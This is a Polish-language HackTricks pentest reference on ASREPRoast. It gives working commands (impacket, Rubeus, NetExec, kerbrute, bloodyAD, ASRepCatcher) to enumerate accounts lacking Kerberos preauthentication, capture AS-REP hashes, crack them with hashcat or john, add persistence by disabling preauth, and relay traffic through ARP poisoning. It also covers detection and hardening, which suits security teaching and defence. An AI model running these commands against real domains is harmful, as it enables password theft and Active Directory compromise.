# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast to atak na zabezpieczenia, który wykorzystuje konta użytkowników, dla których nie włączono atrybutu **wymagającego wstępnego uwierzytelniania Kerberos**. Ta podatność pozwala atakującym zażądać uwierzytelnienia użytkownika od kontrolera domeny (DC) bez znajomości jego hasła. DC odpowiada wtedy wiadomością zaszyfrowaną kluczem wyprowadzonym z hasła użytkownika, którą atakujący mogą próbować złamać offline, aby poznać hasło użytkownika.

Główne wymagania tego ataku to:

- **Brak wstępnego uwierzytelniania Kerberos**: Ta funkcja zabezpieczeń nie może być włączona dla atakowanych użytkowników.
- **Połączenie z kontrolerem domeny (DC)**: Atakujący muszą mieć dostęp do DC, aby wysyłać żądania i otrzymywać zaszyfrowane wiadomości.
- **Opcjonalne konto domenowe**: Posiadanie konta domenowego pozwala atakującym skuteczniej identyfikować podatnych użytkowników za pomocą zapytań LDAP. Bez takiego konta atakujący muszą zgadywać nazwy użytkowników.

#### Enumerowanie podatnych użytkowników (wymagane poświadczenia domenowe)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Żądanie komunikatu AS_REP

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus domyślnie wysyła żądania **RC4**, dlatego w zdarzeniu Event ID **4768** zwykle widnieje **preauth type 0** i **ticket encryption type 0x17**. Jeśli dodasz **`/aes`** (lub RC4 jest wyłączone dla celu), zamiast tego spodziewaj się **AES etypes**.<sup>[[2]](#references)</sup>

#### Krótkie one-linery (Linux)

- Najpierw wylicz potencjalne cele (np. na podstawie wyciekłych ścieżek buildów) za pomocą Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Wykonaj roast całej listy nazw użytkowników bez prawidłowych poświadczeń za pomocą NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Jeśli masz poświadczenia, pozwól NetExec odpytać LDAP i zażądać wszystkich podatnych na roast kont: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Jeśli wynik zaczyna się od **`$krb5asrep$23$`**, złam go za pomocą Hashcat **`-m 18200`**. Jeśli zaczyna się od **`$krb5asrep$17$`** lub **`$krb5asrep$18$`**, użyj John z opcją **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Łamanie

Nie zakładaj, że każdy AS-REP roast używa RC4. Nowoczesne narzędzia mogą zwrócić **RC4** (`$krb5asrep$23$`) lub **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), zależnie od żądanego lub wynegocjowanego enctype. **`hashcat -m 18200`** obsługuje **etype 23**, natomiast **John** bezpośrednio obsługuje `krb5asrep` dla **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistence

Wymuś brak wymogu **preauth** dla użytkownika, wobec którego masz uprawnienia **GenericAll** (lub uprawnienia do zapisu właściwości):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Wykrywanie i wzmacnianie zabezpieczeń

Udane **żądanie AS-REP bez preautentykacji** generuje na DC zdarzenie **4768** z wartościami `Status=0x0` i `PreAuthType=0`; rejestruje ono żądanie, ale nie dowodzi, że ktoś złamał odpowiedź ani przejął konto. Wykrywanie nie powinno wymagać RC4: `TicketEncryptionType=0x17` to przydatny sygnał słabego szyfrowania, ale atakujący może zażądać AES (wartości w dzienniku zdarzeń `0x11`/`0x12`). W systemie Windows Server 2016 i nowszych z aktualizacją zbiorczą z 14 stycznia 2025 r. (lub nowszą) wersja 2 zdarzenia 4768 udostępnia również `ClientAdvertizedEncryptionTypes`, obsługiwane typy szyfrowania i dostępne klucze konta/DC.<sup>[[5]](#references)</sup>

Praktyczne wyszukiwanie podejrzanych zdarzeń oznacza klienta, który reklamuje wyłącznie RC4, mimo że konto ma klucze AES, a następnie koreluje serie żądań z jednego źródłowego adresu IP dotyczące kilku użytkowników bez preautentykacji. Zamiast generować alert dla każdego zdarzenia `PreAuthType=0`, ustal punkt odniesienia dla uzasadnionych wyjątków.

Aby ustalić źródło, ujednolić format pola `IpAddress` (które może zawierać adres IPv4 w formacie `::ffff:`) i porównać przedział czasu ze zdarzeniami 4769 dotyczącymi biletów usługowych lub zdarzeniami 5140 dotyczącymi dostępu do udziałów. Zdarzenia te mogą wskazywać konta aktywne z tego samego adresu, ale żądanie AS-REP bez preautentykacji nie wymaga uwierzytelnionego konta. Współdzielone hosty, NAT, proxy i wiele sesji oznaczają, że zgodność adresu IP **nie** pozwala ustalić, która osoba lub konto wysłało AS-REQ. Potraktuj powiązane konta jako wskazówki do dalszego dochodzenia i potwierdź je dowodami z punktów końcowych lub sieci.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

Trwałym rozwiązaniem jest wyłączenie opcji **Nie wymagaj preautentykacji Kerberos** dla każdego użytkownika, który jej bezwzględnie nie potrzebuje, oraz zmiana ujawnionych haseł kont. Jeśli nie można usunąć wyjątku, użyj długiego, losowo wygenerowanego hasła i przyznaj minimalne uprawnienia. Wyłączenie RC4 zwiększa koszt łamania haseł, ale nie usuwa podatności na roasting, ponieważ odpowiedzi AS-REP zaszyfrowane AES nadal można łamać offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast bez poświadczeń

Atakujący działający na ścieżce komunikacji może przechwycić AS-REP zwrócone podczas standardowej, uwierzytelnionej wymiany AS i przygotować jego zaszyfrowaną część do łamania offline. W przeciwieństwie do klasycznego ASREPRoasting nie wymaga to `DONT_REQ_PREAUTH`; pozwala jednak uzyskać dane tylko tych kont, których wymiana Kerberos została faktycznie przechwycona. **ASRepCatcher** domyślnie uzyskuje pozycję za pomocą jednokierunkowego zatruwania ARP lub może przechwytywać ruch z użyciem innej techniki MitM po podaniu `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Jeśli interesuje Cię powiązana technika bez poświadczeń, która zwraca **bilet usługi** zamiast **TGT** z podmiotu bez preautentykacji, zobacz [Kerberoast](kerberoast.md).

W trybie `relay` narzędzie [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) przekazuje przechwycone AS-REQ i wymusza **RC4**, jeśli obie strony nadal je dopuszczają. Tryb `listen` nie modyfikuje pakietów, więc przechwytuje typ szyfrowania wynegocjowany przez klienta i DC. Jeśli to możliwe, ogranicz zatruwanie za pomocą `-t`/`-tf` zamiast obejmować nim całą podsieć.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Zdarzenie 4768: zażądano biletu uwierzytelniającego Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Zdarzenie zabezpieczeń 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Zdarzenie zabezpieczeń 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
